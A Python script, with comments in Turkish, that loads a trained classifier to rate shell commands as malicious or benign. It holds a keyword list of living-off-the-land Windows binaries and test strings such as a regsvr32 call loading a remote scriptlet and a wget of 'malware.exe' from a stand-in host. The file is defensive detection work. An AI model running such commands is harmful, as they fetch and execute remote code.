import joblib
import numpy as np
import re

# LOLBAS binary listesi (kısaltılmış)
LOLBAS_BINARIES = [
    "regsvr32", "csc", "mshta", "certutil",
    "rundll32", "installutil", "wmic", "bitsadmin"
]

def is_lolbas_command(command):
    """Komut LOLBAS binary içeriyor mu?"""
    cmd_lower = command.lower()
    return any(bin_name in cmd_lower for bin_name in LOLBAS_BINARIES)

def predict_command(command):
    """Komut tahmin fonksiyonu + LOLBAS False Positive düzeltmesi"""
    try:
        model = joblib.load('model.pkl')
        vectorizer = joblib.load('vectorizer.pkl')
        command_vector = vectorizer.transform([command])
        prediction = model.predict(command_vector)[0]

        if hasattr(model, 'predict_proba'):
            probabilities = model.predict_proba(command_vector)[0]
            confidence = max(probabilities) * 100
        elif hasattr(model, 'decision_function'):
            decision_score = model.decision_function(command_vector)[0]
            confidence = min(abs(decision_score) * 10, 100)
        else:
            confidence = 85.0

        risk_level = "GÜVENLİ"
        if prediction == "malicious":
            if confidence > 90:
                risk_level = "YÜKSEK"
            elif confidence > 70:
                risk_level = "ORTA"
            else:
                risk_level = "DÜŞÜK"

        # --- LOLBAS false positive düzeltmesi ---
        if is_lolbas_command(command):
            # Eğer model çok agresifse confidence'ı kırp
            confidence = min(confidence, 70)
            if prediction == "malicious" and confidence < 60:
                # Düşük riskte benign olarak işaretle
                prediction = "benign"
                risk_level = "GÜVENLİ"
            else:
                risk_level = "ORTA" if prediction == "malicious" else "GÜVENLİ"

        result = {
            "command": command,
            "prediction": prediction,
            "confidence": round(confidence, 2),
            "risk_level": risk_level,
            "model_type": model.__class__.__name__
        }
        return result

    except Exception as e:
        return {
            "command": command,
            "prediction": "error",
            "confidence": 0,
            "risk_level": "UNKNOWN",
            "error": str(e)
        }

if __name__ == '__main__':
    test_commands = [
        "ls -la",
        "regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll",
        "csc -target:library file.cs",
        "wget http://malicious.com/malware.exe"
    ]
    for cmd in test_commands:
        result = predict_command(cmd)
        print(f"Komut: {cmd}")
        print(f"Tahmin: {result['prediction']} (Güven: %{result['confidence']}, Risk: {result['risk_level']})")
        print("-" * 50)
